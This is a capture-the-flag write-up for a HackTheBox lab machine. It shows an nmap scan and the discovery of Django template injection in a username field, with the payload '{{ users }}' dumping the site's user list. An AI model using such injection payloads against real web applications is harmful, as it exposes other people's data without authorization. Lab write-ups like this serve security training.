<center>
  
<h1>Machine - HackNet (Medium)</h1>

</center>

<img width="876" height="529" alt="image" src="https://github.com/user-attachments/assets/680211e7-daae-4b64-a1ae-a74373641dcb" />

Hello everyone, today I am writing a write-up for the HackNet machine on HackTheBox. It featured a Django based web application vulnerable to Server-Side Template Injection which later allowed for information disclosure through which we got shell access.<br><br>

Initial nmap Scan:
<pre><code class="language-none">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-17 17:32 CET
Nmap scan report for 10.129.3.27
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
</code></pre>
<br>
We have only HTTP and SSH ports open. After visiting the web app via the virtual host <i>hacknet.htb</i>, this is what we see: 
<br>
<img width="748" height="377" alt="image" src="https://github.com/user-attachments/assets/85459d7f-7adf-4323-af98-6754c8038a5f" />
<br>
I created a new account and started testing various parameters on the social media platform. After quite some time, I struck luck with the username field. I found that it gets reflected in the response of the <code><b>GET</b> /like/{POST_ID}</code> endpoint, which was vulnerable to SSTI (although it's very limited). The request is triggered when you click to see who liked certain post.<br>
<img width="1364" height="222" alt="image" src="https://github.com/user-attachments/assets/075bcd2d-3645-4e99-a4e4-2081d49f9440" /> <br>
Here, it wasn't the classic case of Jinja2 Template, it was Djangos Own Template Lanaguage, which is very limited of what we can actually do. After quite some time, I found the global <i>users</i> QuerySet Object via this simple payload:
<pre><code class="language-none">{{ users }}</code></pre>
Response:
<pre><code class="language-html">&lt;!-- ...PROFILES FROM OTHER USERS -->
  &lt;div class="likes-review-item">
    &lt;a href="/profile/27">
        &lt;img src="/media/profile.png" title="&lt;QuerySet [&lt;SocialUser: hexhunter&gt;, &lt;SocialUser: shadowcaster&gt;, &lt;SocialUser: blackhat_wolf&gt;, &lt;SocialUser: glitch&gt;, &lt;SocialUser: codebreaker&gt;, &lt;SocialUser: shadowmancer&gt;, &lt;SocialUser: whitehat&gt;, &lt;SocialUser: brute_force&gt;, &lt;SocialUser: shadowwalker&gt;, &lt;SocialUser: {{ users }}&gt;]&gt;">
    &lt;/a>
&lt;/div></code></pre>


